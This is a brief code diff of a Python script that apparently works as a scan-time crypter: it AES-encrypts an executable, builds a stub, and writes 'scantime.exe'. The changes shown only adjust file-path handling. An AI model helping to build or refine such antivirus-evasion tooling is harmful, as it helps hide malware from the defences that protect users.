@@ -38,6 +38,7 @@ def encrypt_file(input_file, output_file):
 
 def stub(output_file):
     print("Making the stub for u Please be patient")
+    output_file = output_file.replace("/", "\\")
 
     with open(output_file+'.exe', 'rb') as f:
         binary_data = f.read()
@@ -59,7 +60,7 @@ iv = bytes.fromhex(iv)
 
 cipher = AES.new(key, AES.MODE_CBC, iv)
 
-input_file = f'{output_file}.exe'
+input_file = fr'{output_file}.exe'
 output_file = 'scantime.exe'
 
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), input_file)
